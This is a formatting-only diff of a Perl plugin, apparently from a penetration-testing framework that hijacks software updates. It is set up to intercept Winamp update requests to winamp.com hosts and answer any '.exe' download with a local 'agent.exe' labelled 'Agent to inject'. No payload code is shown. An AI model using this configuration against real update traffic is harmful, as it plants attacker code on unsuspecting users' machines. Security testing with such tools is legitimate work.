@@ -27,61 +27,62 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'Winamp',
-    'version' => '1.0',
-    'appver'  => '< 5.581',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobyte.com>' ],
-    'description' => qq{},    
-    'vh' => '(www.winamp.com|client.winamp.com)',
-    'request' => [
-		    {
-		    'req' => '/update/latest-version.php', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => "",
-		    'parse' => 1,
-		    'file' => './include/winamp/latest-version.php',
-		    },
-		    {
-		    'req' => '/update/client/notice.php', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => './include/winamp/notice.php',
-		    },
+my $base = {
+    'name'        => 'Winamp',
+    'version'     => '1.0',
+    'appver'      => '< 5.581',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobyte.com>'],
+    'description' => qq{},
+    'vh'          => '(www.winamp.com|client.winamp.com)',
+    'request'     => [
+        {   'req'  => '/update/latest-version.php', #regex friendly
+            'type' => 'file',                       #file|string|agent|install
+            'method' => '',                                      #any
+            'bin'    => 0,
+            'string' => "",
+            'parse'  => 1,
+            'file'   => './include/winamp/latest-version.php',
+        },
+        {   'req'  => '/update/client/notice.php',  #regex friendly
+            'type' => 'file',                       #file|string|agent|install
+            'method' => '',                              #any
+            'bin'    => 0,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => './include/winamp/notice.php',
+        },
 
-		    {
-		    'req' => '(/update/client_session.php|/nowplaying/mini|/update/do_im.php)', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => '',
-		    },
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
+        {   'req' =>
+                '(/update/client_session.php|/nowplaying/mini|/update/do_im.php)'
+            ,                                            #regex friendly
+            'type'   => 'string',    #file|string|agent|install
+            'method' => '',          #any
+            'bin'    => 0,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => '',
+        },
+        {   'req'    => '.exe',      #regex friendly
+            'type'   => 'agent',     #file|string|agent|install
+            'method' => '',          #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-		 }
-};
 
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+    }
+};
 
 ##########################################################################
 # FUNCTION      new
